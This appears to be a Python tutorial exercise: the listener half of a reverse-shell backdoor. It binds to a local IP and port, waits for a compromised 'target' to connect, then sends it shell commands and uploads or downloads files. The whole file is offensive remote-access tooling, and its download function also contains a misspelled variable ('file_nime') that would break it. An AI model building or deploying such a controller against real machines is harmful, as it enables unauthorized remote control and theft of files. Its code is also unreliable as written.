import socket # Allows us to initiate an internet connection between machines.
import json
import os

def reliable_send(data):
	jsondata = json.dumps(data)
	target.send(jsondata.encode())

def reliable_recv():
	data = ''
	while True:
		try:
			data = data + target.recv(1024).decode().rstrip()#amount of bytes we wanna receive, decoding back, striping from any additional characters
			return json.loads(data)
		except ValueError:
			continue

def upload_file(file_name):
	f = open(file_name, 'rb')# Reading the contents of the file
	target.send(f.read())

def download_file(file_name):
	f = open(file_nime, 'wb')# open/create the file in which the content of the file that we want to download will be stored
	target.settimeout(1)
	chunk = target.recv(1024)# variable which stores parts of content of the file
	while chunk:# receiving bytes until there are some
		f.write(chunk)
		try:
			chunk = target.recv(1024)
		except socket.timeout as e:
			break
	target.settimeout(None)
	f.close()

def target_communication():# Making functiion for communication with target. Sending commands with the infinite loop and breaking when the command is 'quit'
	while True:
		command = input('* Shell ~%s: ' % str(ip))
		reliable_send(command)# Sending the command to the target.
		if command == 'quit':
			break
		elif command == 'clear':
			os.system('clear')
		elif command[:8] == 'download':
			download_file(command[9:])# sending command containing file name
		elif command[:6] == 'upload':
			upload_file(command[7:])
		else:
			result = reliable_recv()# Storing the response of the command that we received from backdoor using this func.
			print(result)
		



sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM) # Initiating a socket object. 
# socket.AF_INET - Tells our program that we are going to make a connection over IPv4 address.
# socket.SOCK_STREAM - Tells our program that we are going to use the TCP connection.

sock.bind(("192.168.1.115", 5555)) # Binding IP-address with the port

print('[+] Listening For The Incoming Connections')
sock.listen(5) # Listening up to 5 connections.

target, ip = sock.accept() # Accepting the incoming connection and storing the targets socket object and the IP
print("[+] Target Connected From: " + str(ip))


target_communication()
